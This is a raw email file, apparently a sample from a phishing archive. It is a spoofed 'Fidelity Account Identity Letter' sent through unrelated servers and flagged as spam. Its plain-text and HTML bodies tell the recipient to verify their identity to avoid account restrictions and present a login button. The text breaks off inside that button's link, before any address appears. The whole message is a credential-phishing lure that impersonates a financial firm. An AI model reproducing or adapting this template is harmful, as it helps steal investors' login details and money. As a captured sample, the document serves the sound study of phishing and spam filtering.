@@ -1,0 +1,931 @@
+Return-Path: mohsen.kanani@peykasa.ir
+Delivered-To: jose@monkey.org
+X-FDA: 82872355566.26.CA48AF9
+Received: from email.sindhhealth.gov.pk (email.sindhhealth.gov.pk
+ [204.48.25.99])	by imf05.b.hostedemail.com (Postfix) with ESMTP id
+ 80AD91C0005	for <jose@monkey.org>; Sun,  8 Dec 2024 16:40:34 +0000 (UTC)
+Authentication-Results: imf05.b.hostedemail.com;	dkim=none;	spf=softfail
+ (imf05.b.hostedemail.com: 204.48.25.99 is neither permitted nor denied by
+ domain of mohsen.kanani@peykasa.ir) smtp.mailfrom=mohsen.kanani@peykasa.ir;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1733676035;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	 references;
+ bh=UbN6686pQUcP+GlggaD5YSeJQcmWng07ou6jxxAzGSc=;
+	b=X0nZCuOAFeDwJlXxDLyCOti2SJ+kwpBmZTv4msMdZXML3AVVOGtbCI+jB9RHT84mWjyK8k
+	x51T3HIPYYwBzp1DnkHgRDJ3K0Emf17FYwEu5ccIcdlDQOYnZzGSchIvTD1Lg07OIg6EAq
+	4BZHVqghZuzsHdWMbu+bEFALRU6/wEE=
+ARC-Authentication-Results: i=1;	imf05.b.hostedemail.com;	dkim=none;
+	spf=softfail (imf05.b.hostedemail.com: 204.48.25.99 is neither permitted nor
+ denied by domain of mohsen.kanani@peykasa.ir)
+ smtp.mailfrom=mohsen.kanani@peykasa.ir;	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1733676035; a=rsa-sha256;
+	cv=none;
+	b=UPyQRpTbUz9IaQevm8rBsLQK/cF1gA9U90/oaM69DV8t0CM5j3kRRPA5MpvNreEG5DU9Pi
+	A2Iqo+77OVYQcDReoZvqFpGGzTccTFYYHd/Mz7vtXejShRDQDVM2QThKNDdtjdxaD2Pk1H
+	CSjaqfWTrfm3oft1biCMwxWovD6Y+jU=
+Received: from email.sindhhealth.gov.pk (mail.sindhhealth.gov.pk [127.0.0.1])
+	by email.sindhhealth.gov.pk (Postfix) with ESMTPS id 97DABB82533;
+	Sat,  7 Dec 2024 20:07:13 +0500 (PKT)
+Received: from localhost (mail.sindhhealth.gov.pk [127.0.0.1])
+	by email.sindhhealth.gov.pk (Postfix) with ESMTP id CD64124AE1C;
+	Sat,  7 Dec 2024 18:09:05 +0500 (PKT)
+X-Virus-Scanned: amavisd-new at email.sindhhealth.gov.pk
+Received: from email.sindhhealth.gov.pk ([127.0.0.1])
+	by localhost (email.sindhhealth.gov.pk [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id IB8xNzoD1lu0; Sat,  7 Dec 2024 18:09:05 +0500 (PKT)
+Received: from WIN-OQJV471D95R.contaboserver.net (vmi2279643.contaboserver.net
+ [178.212.35.111])	by email.sindhhealth.gov.pk (Postfix) with ESMTPSA id
+ 96F3F1BFA81D;	Sat,  7 Dec 2024 18:08:44 +0500 (PKT)
+Content-Type: multipart/alternative; boundary="===============0301115945=="
+MIME-Version: 1.0
+Subject: Fidelity: Account-Identity Review Letter.
+To: Recipients <mohsen.kanani@peykasa.ir>
+From: "Fidelity Investments." <mohsen.kanani@peykasa.ir>
+Date: Sat, 07 Dec 2024 05:08:23 -0800
+Message-Id: <20241207130844.96F3F1BFA81D@email.sindhhealth.gov.pk>
+X-Rspam-User: 
+X-Rspamd-Server: rspam12
+X-Rspamd-Queue-Id: 80AD91C0005
+X-Stat-Signature: niti53xw5rcwmou8sama66j8arz15xpy
+X-Spam-Status: Yes, score=16.64
+X-HE-Tag: 1733676034-6640
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/vBV/X8t8MC/W063DL6bSEgUK+DPz6GH67xDShQLUYu4G?=
+ =?utf-8?q?8J1dUWsIL5nJ8o/SYagd+fC06LQtknGbbRKcO80bnnZHOTVbJwH2C+dpAM3PgQvSp?=
+ =?utf-8?q?05D4fPhZr+adXZQ7uwsZRPZPi3RKj9LQeO8RMQvCYxNZLWIPLeEf52hpi8y6Snvo9?=
+ =?utf-8?q?bwzfyglvzJZ46mXQfdO164uuzXqcY2XPq9KuVWUYDg5hRonlNHjfwU1neElURyskZ?=
+ =?utf-8?q?JgMULvcP2WPyPL6Yeslt2xJZX6BtA+hWSF5McOTGCOPhW7pU5RS/zAWqTKYk+klK0?=
+ =?utf-8?q?sFnrGVLmTQpTodpvg1NJNdb9r1bv58Fnmq/EmUPkWzLoOv6NQWOhMU8wfDl4Oya8E?=
+ =?utf-8?q?gDnxVBPaEdc8iLCzB2Mz4Cwc8P1Q/RziO4pSUMdZ0TKIw9Omcn2e6MjW9yRyxytQl?=
+ =?utf-8?q?5KjOjCqXtaJIz+VRAU4st2oCe5pwHu2yOyecyWAMhx8YZdioKAWjAdZxxr3ZsxKK2?=
+ =?utf-8?q?6rAp4UR/hqimj+cXwJMYqMA5jmWQcWCHAckxYL5hIT6xF1KFHHRkR7U2PC7NayVO6?=
+ =?utf-8?q?H8Ki4UxWeklI4P3P2Op6XVMCVKD3l8nArl+q2oec4A9e9KD50qcb9Ofs+wRs5WivJ?=
+ =?utf-8?q?Ui7i9p4zWAjx+hq0vZuaizLhLsOoO28hCGLb9OgwktCu9tDSg1PFpvXqbzixxdJh0?=
+ =?utf-8?q?ZZ8+9ShVHb4OYy7oHLKDtzOgbljfdg155gZomMXl3sbzN9z6Q9BLBoHJJdE0r/9/4?=
+ =?utf-8?q?M6mTj/iJbNgje2zP+fwxMOWMVwaarwZh8MfClQnteBJm+uC1kHqqMJw1W7soBq8mB?=
+ =?utf-8?q?qUHBkcvzB+EytdPn/oRLMDvpRmDMyWZ4xTQnXXmGlp/H2APLu/jmUls5MqBGBgBCr?=
+ =?utf-8?q?+i/nYSc2CA0hJ2JS9XqK/e7JGqnqu2RXZdYixOu20JFXuDks69zoaw0+xOzX5VXQb?=
+ =?utf-8?q?syCNKolE5alFFdy3wZtuYU_I126w0qnHHIJ/GQ0ey9h1dTPQk4kXD/2cr/v/sUtpr?=
+ =?utf-8?q?whxdxqYV6I1Eib4DFOgEchNa/tt60ES8UKKDXaO4Nv9esYFmT9C2tCf6Y2d/Rlcgc?=
+ =?utf-8?q?viw8VrfGZpozXeq3mMYsa3UStzEsedGemKEKd9kTvMARbjONhskH4mjeM56N4Pw+R?=
+ =?utf-8?q?RE00YvU5Bda+/TqFcrKS6nYu9acdnDT+KOIQPQtK2hBZqyGOH6wUsNFndgsDj3lVO?=
+ =?utf-8?q?UWTCq8bQ45oEorVw8QMKbRU7lcqSYiGKoHEe78WGUdiIooo047iWwSMxxgzaNx4Gz?=
+ =?utf-8?q?imWdmgWrv27LQ=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 384
+
+You will not see this in a MIME-aware mail reader.
+--===============0301115945==
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+ =
+
+    =
+
+    =
+
+    =
+
+      Fidelity 	   	                        	    	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+    =
+
+    =
+
+    =
+
+     Fidelity Account Identity Letter.	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+    =
+
+    =
+
+    =
+
+    =
+
+      Dear Customer,
+ Dear Customer,  Please Verify it=92s you, to avoid account restrictions fo=
+llow the steps to Verify your   Fidelity Identity For security reasons.
+  =
+
+   =
+
+    =
+
+    =
+
+    =
+
+    Log in to view your recent account activities for your safety:	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+   =
+
+    =
+
+    =
+
+    =
+
+    =
+
+   View to Verify Identity	 =
+
+  Or go to Fidelity.com/Fid_reports.	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+  =
+
+    =
+
+    =
+
+    	 =
+
+  	 =
+
+  	 =
+
+  =
+
+    =
+
+    =
+
+    =
+
+      Thank you for the opportunity to serve you.   Fidelity Investment	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+    =
+
+    =
+
+    =
+
+     PERSPECTIVE  |  PRIVACY | CONTACT US | LOG IN                     	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+    =
+
+    =
+
+    =
+
+    =
+
+     If you have any questions or concerns, PLEASE DO NOT REPLY TO THIS EMA=
+IL. Instead, visit  fidelity.com/contactus to identify a fast and simple wa=
+y to get in touch.	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+  	 =
+
+ =20
+--===============0301115945==
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<html>
+
+<head>
+<meta http-equiv=3D"Content-Language" content=3D"en-us">
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8">
+<title>New Page 3</title>
+</head>
+
+<body>
+
+<table class=3D"main" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" styl=
+e=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; font-family:=
+ Arial, sans-serif; border-collapse: separate; color: rgb(0, 0, 0); font-si=
+ze: 14px; font-style: normal; font-variant-ligatures: normal; font-variant-=
+caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-al=
+ign: start; text-transform: none; widows: 2; word-spacing: 0px; -webkit-tex=
+t-stroke-width: 0px; white-space: normal; text-decoration-thickness: initia=
+l; text-decoration-style: initial; text-decoration-color: initial; width: 7=
+60px; border: 0px none; padding: 0px; background: rgb(255, 255, 255)">
+	<tbody style=3D"-webkit-font-smoothing: antialiased">
+		<tr style=3D"-webkit-font-smoothing: antialiased; white-space: normal; te=
+xt-size-adjust: none !important; margin: 0px auto !important">
+			<td style=3D"-webkit-font-smoothing: antialiased; white-space: normal; t=
+ext-size-adjust: none !important; margin: 0px auto !important">
+			<table cellpadding=3D"0" cellspacing=3D"0" width=3D"99%" class=3D"stylin=
+gblock-content-wrapper" style=3D"-webkit-font-smoothing: antialiased; borde=
+r-spacing: 0px; font-family: Arial, sans-serif; border-collapse: collapse; =
+min-width: 100%; background-color: transparent">
+				<tbody style=3D"-webkit-font-smoothing: antialiased">
+					<tr style=3D"-webkit-font-smoothing: antialiased; white-space: normal;=
+ text-size-adjust: none !important; margin: 0px auto !important">
+						<td class=3D"stylingblock-content-wrapper camarker-inner" style=3D"-w=
+ebkit-font-smoothing: antialiased; white-space: normal; text-size-adjust: n=
+one !important; margin: 0px auto !important; padding: 0px">
+						<table class=3D"light-logo" align=3D"center" border=3D"0" cellpadding=
+=3D"0" cellspacing=3D"0" width=3D"98%" style=3D"-webkit-font-smoothing: ant=
+ialiased; border-spacing: 0px; font-family: Arial, sans-serif; border-colla=
+pse: collapse">
+							<tbody style=3D"-webkit-font-smoothing: antialiased">
+								<tr style=3D"-webkit-font-smoothing: antialiased; white-space: norm=
+al; text-size-adjust: none !important; margin: 0px auto !important">
+									<td class=3D"light-logo mobile-lr-padding2" align=3D"center" valig=
+n=3D"top" style=3D"-webkit-font-smoothing: antialiased; white-space: normal=
+; text-size-adjust: none !important; margin: 0px auto !important; padding-b=
+ottom: 12px; background-color: rgb(244, 245, 246)">
+									<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=
+=3D"0" width=3D"99%" style=3D"-webkit-font-smoothing: antialiased; border-s=
+pacing: 0px; font-family: Arial, sans-serif; border-collapse: collapse">
+										<tbody style=3D"-webkit-font-smoothing: antialiased">
+											<tr style=3D"-webkit-font-smoothing: antialiased; white-space: n=
+ormal; text-size-adjust: none !important; margin: 0px auto !important">
+												<td align=3D"left" valign=3D"top" style=3D"-webkit-font-smoothi=
+ng: antialiased; white-space: normal; text-size-adjust: none !important; wi=
+dth: 153px; margin: 0px auto !important">
+												<i><b>
+												<font size=3D"6" color=3D"#008000" face=3D"Arial Black">
+												Fidelity</font></b></i><span style=3D"color: #008000; font-fami=
+ly: Arial Black; font-size: 16px; font-style: normal; font-variant-ligature=
+s: normal; font-variant-caps: normal; font-weight: 600; letter-spacing: nor=
+mal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none;=
+ widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space:=
+ pre-wrap; text-decoration-thickness: initial; text-decoration-style: initi=
+al; text-decoration-color: initial; display: inline !important; float: none=
+; background-color: rgb(255, 255, 255)"> </span></td>
+												<td style=3D"-webkit-font-smoothing: antialiased; white-space: =
+normal; text-size-adjust: none !important; width: 4px; margin: 0px auto !im=
+portant">
+												&nbsp;</td>
+												<td class=3D"infobox font-style-PH" align=3D"right" valign=3D"c=
+enter" style=3D"-webkit-font-smoothing: antialiased; white-space: normal; t=
+ext-size-adjust: none !important; font-family: arial, sans-serif; font-size=
+: 13px; line-height: 20px; color: rgb(90, 103, 114); font-weight: normal; m=
+argin: 0px auto !important; padding-top: 12px">
+												<b><span style=3D"-webkit-font-smoothing: antialiased"><font co=
+lor=3D"#0000FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;
+												</font>
+												</span></b>
+												<b style=3D"-webkit-font-smoothing: antialiased">
+												<font color=3D"#0000FF">&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;
+												</b></td>
+												<td style=3D"-webkit-font-smoothing: antialiased; white-space: =
+normal; text-size-adjust: none !important; width: 6px; margin: 0px auto !im=
+portant">
+												<b style=3D"-webkit-font-smoothing: antialiased">
+												&nbsp;</b></td>
+											</tr>
+									</table>
+									</td>
+								</tr>
+						</table>
+						</td>
+					</tr>
+			</table>
+			</td>
+		</tr>
+		<tr style=3D"-webkit-font-smoothing: antialiased; white-space: normal; te=
+xt-size-adjust: none !important; margin: 0px auto !important">
+			<td style=3D"-webkit-font-smoothing: antialiased; white-space: normal; t=
+ext-size-adjust: none !important; margin: 0px auto !important">
+			<b style=3D"-webkit-font-smoothing: antialiased">
+			<table cellpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D"styli=
+ngblock-content-wrapper" style=3D"-webkit-font-smoothing: antialiased; bord=
+er-spacing: 0px; font-family: Arial, sans-serif; border-collapse: collapse;=
+ min-width: 100%">
+				<tbody style=3D"-webkit-font-smoothing: antialiased">
+					<tr style=3D"-webkit-font-smoothing: antialiased; white-space: normal;=
+ text-size-adjust: none !important; margin: 0px auto !important">
+						<td class=3D"stylingblock-content-wrapper camarker-inner" style=3D"-w=
+ebkit-font-smoothing: antialiased; white-space: normal; text-size-adjust: n=
+one !important; margin: 0px auto !important">
+						<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"100%=
+" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; font-f=
+amily: Arial, sans-serif; border-collapse: collapse">
+							<tbody style=3D"-webkit-font-smoothing: antialiased">
+								<tr style=3D"-webkit-font-smoothing: antialiased; white-space: norm=
+al; text-size-adjust: none !important; margin: 0px auto !important">
+									<td align=3D"center" class=3D"dark-background-body mobile-lr-paddi=
+ng" valign=3D"top" style=3D"-webkit-font-smoothing: antialiased; white-spac=
+e: normal; text-size-adjust: none !important; margin: 0px auto !important; =
+background-color: rgb(244, 245, 246)">
+									<table class=3D"light-mode-statusheader" align=3D"center" border=
+=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"97%" bgcolor=3D"#006E99=
+" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; font-f=
+amily: Arial, sans-serif; border-collapse: collapse">
+										<tbody style=3D"-webkit-font-smoothing: antialiased">
+											<tr style=3D"-webkit-font-smoothing: antialiased; white-space: n=
+ormal; text-size-adjust: none !important; margin: 0px auto !important">
+												<td class=3D"light-mode-statusheader" align=3D"center" valign=
+=3D"top" style=3D"-webkit-font-smoothing: antialiased; white-space: normal;=
+ text-size-adjust: none !important; margin: 0px auto !important; padding-le=
+ft: 24px; padding-right: 24px; padding-top: 16px; padding-bottom: 24px" bgc=
+olor=3D"#008000">
+												<font size=3D"4" color=3D"#FFFFFF" face=3D"Arial Black">
+												<b>Fidelity Account Identity =
+
+												Letter.</b></font></td>
+											</tr>
+									</table>
+									</td>
+								</tr>
+						</table>
+						</td>
+					</tr>
+			</table>
+			</b></td>
+		</tr>
+		<tr style=3D"-webkit-font-smoothing: antialiased; white-space: normal; te=
+xt-size-adjust: none !important; margin: 0px auto !important">
+			<td class=3D"wrapper" style=3D"-webkit-font-smoothing: antialiased; whit=
+e-space: normal; text-size-adjust: 100%; width: 760px; table-layout: fixed;=
+ margin: 0px auto !important">
+			<b style=3D"-webkit-font-smoothing: antialiased">
+			<table cellpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D"styli=
+ngblock-content-wrapper" style=3D"-webkit-font-smoothing: antialiased; bord=
+er-spacing: 0px; font-family: Arial, sans-serif; border-collapse: collapse;=
+ min-width: 100%">
+				<tbody style=3D"-webkit-font-smoothing: antialiased">
+					<tr style=3D"-webkit-font-smoothing: antialiased; white-space: normal;=
+ text-size-adjust: none !important; margin: 0px auto !important">
+						<td class=3D"stylingblock-content-wrapper camarker-inner" style=3D"-w=
+ebkit-font-smoothing: antialiased; white-space: normal; text-size-adjust: n=
+one !important; margin: 0px auto !important">
+						<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"100%=
+" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; font-f=
+amily: Arial, sans-serif; border-collapse: collapse">
+							<tbody style=3D"-webkit-font-smoothing: antialiased">
+								<tr style=3D"-webkit-font-smoothing: antialiased; white-space: norm=
+al; text-size-adjust: none !important; margin: 0px auto !important">
+									<td align=3D"center" class=3D"dark-background mobile-lr-padding" v=
+align=3D"top" style=3D"-webkit-font-smoothing: antialiased; white-space: no=
+rmal; text-size-adjust: none !important; margin: 0px auto !important; backg=
+round-color: rgb(244, 245, 246)">
+									<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"1=
+00%" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; fon=
+t-family: Arial, sans-serif; border-collapse: collapse">
+										<tbody style=3D"-webkit-font-smoothing: antialiased">
+											<tr style=3D"-webkit-font-smoothing: antialiased; white-space: n=
+ormal; text-size-adjust: none !important; margin: 0px auto !important">
+												<td align=3D"center" class=3D"dark-background-body" valign=3D"t=
+op" style=3D"-webkit-font-smoothing: antialiased; white-space: normal; text=
+-size-adjust: none !important; margin: 0px auto !important; background-colo=
+r: rgb(255, 255, 255)">
+												<table align=3D"left" border=3D"0" cellpadding=3D"0" cellspacin=
+g=3D"0" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; =
+font-family: Arial, sans-serif; border-collapse: collapse" width=3D"760">
+													<tbody style=3D"-webkit-font-smoothing: antialiased">
+														<tr style=3D"-webkit-font-smoothing: antialiased; white-space=
+: normal; text-size-adjust: none !important; margin: 0px auto !important">
+															<td align=3D"left" bgcolor=3D"#ffffff" class=3D"dark-backgro=
+und-body  mobile-body-padding" valign=3D"middle" style=3D"-webkit-font-smoo=
+thing: antialiased; white-space: normal; text-size-adjust: none !important;=
+ font-family: 'charles modern', arial, sans-serif; font-size: 16px; color: =
+rgb(0, 0, 0); border-radius: 0px; margin: 0px auto !important; padding-left=
+: 24px; padding-right: 24px; padding-top: 5px; padding-bottom: 24px; backgr=
+ound-color: rgb(255, 255, 255)">
+			<b style=3D"-webkit-font-smoothing: antialiased">
+															<font color=3D"#FFFFFF">
+															Dear Customer,</font><br>
+															<b>Dear Customer,</b></b><p>
+															<span style=3D"font-style: inherit; font-variant: inherit; f=
+ont-weight: inherit; font-stretch: inherit; font-size: 14px; line-height: i=
+nherit; font-family: Arial, Helvetica, sans-serif; font-optical-sizing: inh=
+erit; font-kerning: inherit; font-feature-settings: inherit; font-variation=
+-settings: inherit; vertical-align: baseline; color: rgb(51, 51, 51); ">
+															Please Verify it=E2=80=99s =
+
+															you, to avoid =
+
+															account restrictions =
+
+															follow the steps to =
+
+															Verify your </span>
+															<span style=3D"font-style: inherit; font-variant: inherit; f=
+ont-weight: 700; font-stretch: inherit; font-size: 14px; line-height: inher=
+it; font-family: Arial, Helvetica, sans-serif; font-optical-sizing: inherit=
+; font-kerning: inherit; font-feature-settings: inherit; font-variation-set=
+tings: inherit; vertical-align: baseline; color: rgb(51, 51, 51); ">
+															Fidelity</span><span style=3D"font-style: inherit; font-vari=
+ant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 14px;=
+ line-height: inherit; font-family: Arial, Helvetica, sans-serif; font-opti=
+cal-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit;=
+ font-variation-settings: inherit; vertical-align: baseline; color: rgb(51,=
+ 51, 51); "> =
+
+															Identity For =
+
+															security reasons.</span></p>
+			<b style=3D"-webkit-font-smoothing: antialiased">
+						<table class=3D"main" border=3D"0" cellpadding=3D"0" cellspacing=3D"0=
+" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; font-f=
+amily: Arial, sans-serif; border-collapse: separate; width: 600px; border: =
+0px none; padding: 0px; background: rgb(255, 255, 255)">
+								<tr style=3D"-webkit-font-smoothing: antialiased; white-space: norm=
+al; text-size-adjust: none !important; margin: 0px auto !important">
+									<td class=3D"wrapper" style=3D"-webkit-font-smoothing: antialiased=
+; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; whit=
+e-space: normal; text-size-adjust: 100%; width: 600px; table-layout: fixed;=
+ margin: 0px auto !important">
+									<table cellpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D=
+"stylingblock-content-wrapper" style=3D"-webkit-font-smoothing: antialiased=
+; border-spacing: 0px; font-family: Arial, sans-serif; border-collapse: col=
+lapse; min-width: 100%">
+										<tbody style=3D"-webkit-font-smoothing: antialiased">
+											<tr style=3D"-webkit-font-smoothing: antialiased; white-space: n=
+ormal; text-size-adjust: none !important; margin: 0px auto !important">
+												<td class=3D"stylingblock-content-wrapper camarker-inner" style=
+=3D"-webkit-font-smoothing: antialiased; font-family: Verdana, Arial, Helve=
+tica, sans-serif; font-size: 14px; white-space: normal; text-size-adjust: n=
+one !important; margin: 0px auto !important">
+												<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=
+=3D"100%" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px=
+; font-family: Arial, sans-serif; border-collapse: collapse">
+													<tbody style=3D"-webkit-font-smoothing: antialiased">
+														<tr style=3D"-webkit-font-smoothing: antialiased; white-space=
+: normal; text-size-adjust: none !important; margin: 0px auto !important">
+															<td align=3D"center" class=3D"dark-background mobile-lr-padd=
+ing" valign=3D"top" style=3D"-webkit-font-smoothing: antialiased; font-fami=
+ly: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: no=
+rmal; text-size-adjust: none !important; margin: 0px auto !important; backg=
+round-color: rgb(244, 245, 246)">
+															<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" widt=
+h=3D"100%" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0p=
+x; font-family: Arial, sans-serif; border-collapse: collapse">
+																<tbody style=3D"-webkit-font-smoothing: antialiased">
+																	<tr style=3D"-webkit-font-smoothing: antialiased; white-sp=
+ace: normal; text-size-adjust: none !important; margin: 0px auto !important=
+">
+																		<td align=3D"center" class=3D"dark-background-body" valig=
+n=3D"top" style=3D"-webkit-font-smoothing: antialiased; font-family: Verdan=
+a, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; text=
+-size-adjust: none !important; margin: 0px auto !important; background-colo=
+r: rgb(255, 255, 255)">
+																		<table align=3D"left" border=3D"0" cellpadding=3D"0" cell=
+spacing=3D"0" style=3D"-webkit-font-smoothing: antialiased; border-spacing:=
+ 0px; font-family: Arial, sans-serif; border-collapse: collapse">
+																			<tbody style=3D"-webkit-font-smoothing: antialiased">
+																				<tr style=3D"-webkit-font-smoothing: antialiased; white=
+-space: normal; text-size-adjust: none !important; margin: 0px auto !import=
+ant">
+																					<td align=3D"left" bgcolor=3D"#ffffff" class=3D"dark-b=
+ackground-body  mobile-body-padding" valign=3D"middle" style=3D"-webkit-fon=
+t-smoothing: antialiased; font-family: 'charles modern', arial, sans-serif;=
+ font-size: 13px; white-space: normal; text-size-adjust: none !important; c=
+olor: rgb(0, 0, 0); border-radius: 0px; margin: 0px auto !important; paddin=
+g-left: 24px; padding-right: 24px; padding-top: 20px; padding-bottom: 0px; =
+background-color: rgb(255, 255, 255)">
+																					<p class=3D"dark-background-body" style=3D"-webkit-fon=
+t-smoothing: antialiased; white-space: normal; text-size-adjust: none !impo=
+rtant; color: rgb(0, 0, 0); font-family: arial, helvetica, sans-serif; font=
+-size: 16px; font-weight: normal; line-height: 24px; margin: 0px; padding: =
+0px">Log in to view your recent account activities for your safety:</td>
+																				</tr>
+																		</table>
+																		</td>
+																	</tr>
+															</table>
+															</td>
+														</tr>
+												</table>
+												</td>
+											</tr>
+									</table>
+									</td>
+								</tr>
+								<tr style=3D"-webkit-font-smoothing: antialiased; white-space: norm=
+al; text-size-adjust: none !important; margin: 0px auto !important">
+									<td class=3D"wrapper" style=3D"-webkit-font-smoothing: antialiased=
+; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; whit=
+e-space: normal; text-size-adjust: 100%; width: 600px; table-layout: fixed;=
+ margin: 0px auto !important">
+									<table cellpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D=
+"stylingblock-content-wrapper" style=3D"-webkit-font-smoothing: antialiased=
+; border-spacing: 0px; font-family: Arial, sans-serif; border-collapse: col=
+lapse; min-width: 100%">
+										<tbody style=3D"-webkit-font-smoothing: antialiased">
+											<tr style=3D"-webkit-font-smoothing: antialiased; white-space: n=
+ormal; text-size-adjust: none !important; margin: 0px auto !important">
+												<td class=3D"stylingblock-content-wrapper camarker-inner" style=
+=3D"-webkit-font-smoothing: antialiased; font-family: Verdana, Arial, Helve=
+tica, sans-serif; font-size: 14px; white-space: normal; text-size-adjust: n=
+one !important; margin: 0px auto !important">
+												<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=
+=3D"100%" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px=
+; font-family: Arial, sans-serif; border-collapse: collapse">
+													<tbody style=3D"-webkit-font-smoothing: antialiased">
+														<tr style=3D"-webkit-font-smoothing: antialiased; white-space=
+: normal; text-size-adjust: none !important; margin: 0px auto !important">
+															<td align=3D"center" class=3D"dark-background-body mobile-lr=
+-padding" style=3D"-webkit-font-smoothing: antialiased; font-family: Verdan=
+a, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; text=
+-size-adjust: none !important; margin: 0px auto !important">
+															<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" widt=
+h=3D"100%" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0p=
+x; font-family: Arial, sans-serif; border-collapse: collapse">
+																<tbody style=3D"-webkit-font-smoothing: antialiased">
+																	<tr style=3D"-webkit-font-smoothing: antialiased; white-sp=
+ace: normal; text-size-adjust: none !important; margin: 0px auto !important=
+">
+																		<td align=3D"center" class=3D"dark-background-body" style=
+=3D"-webkit-font-smoothing: antialiased; font-family: Verdana, Arial, Helve=
+tica, sans-serif; font-size: 14px; white-space: normal; text-size-adjust: n=
+one !important; margin: 0px auto !important; background-color: rgb(255, 255=
+, 255)">
+																		<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" w=
+idth=3D"100%" style=3D"-webkit-font-smoothing: antialiased; border-spacing:=
+ 0px; font-family: Arial, sans-serif; border-collapse: collapse">
+																			<tbody style=3D"-webkit-font-smoothing: antialiased">
+																				<tr style=3D"-webkit-font-smoothing: antialiased; white=
+-space: normal; text-size-adjust: none !important; margin: 0px auto !import=
+ant">
+																					<td align=3D"center" class=3D"dark-background-body" va=
+lign=3D"top" style=3D"-webkit-font-smoothing: antialiased; font-family: Ver=
+dana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; t=
+ext-size-adjust: none !important; margin: 0px auto !important; padding-left=
+: 0px; padding-right: 0px; padding-top: 25px; padding-bottom: 5px; backgrou=
+nd-color: rgb(255, 255, 255)">
+																					<table align=3D"center" border=3D"0" cellpadding=3D"0"=
+ cellspacing=3D"0" style=3D"-webkit-font-smoothing: antialiased; border-spa=
+cing: 0px; font-family: Arial, sans-serif; border-collapse: collapse">
+																						<tbody style=3D"-webkit-font-smoothing: antialiased">
+																							<tr style=3D"-webkit-font-smoothing: antialiased; wh=
+ite-space: normal; text-size-adjust: none !important; margin: 0px auto !imp=
+ortant">
+																								<td align=3D"center" bgcolor=3D"#007900" class=3D"d=
+ark-background-body" valign=3D"middle" style=3D"-webkit-font-smoothing: ant=
+ialiased; font-family: 'charles modern', arial, sans-serif; font-size: 19px=
+; white-space: normal; text-size-adjust: none !important; color: rgb(255, 2=
+55, 255); border-radius: 0px; max-height: 48px; margin: 0px auto !important=
+; background-color: rgb(0, 121, 0)"><span class=3D"Object" role=3D"link" id=
+=3D"OBJ_PREFIX_DWT158_com_zimbra_url" style=3D"-webkit-font-smoothing: anti=
+aliased; white-space: normal; text-size-adjust: none !important; margin: 0p=
+x auto !important"><a target=3D"_blank" rel=3D"nofollow noopener noreferrer=
+" style=3D"-webkit-font-smoothing: antialiased; white-space: normal; text-s=
+ize-adjust: none !important; text-decoration: none; color: rgb(255, 255, 25=
+5); display: block; font-size: 19px; font-family: arial, helvetica, sans-se=
+rif; text-align: center; border-radius: 0px; max-height: 48px; border: 1px =
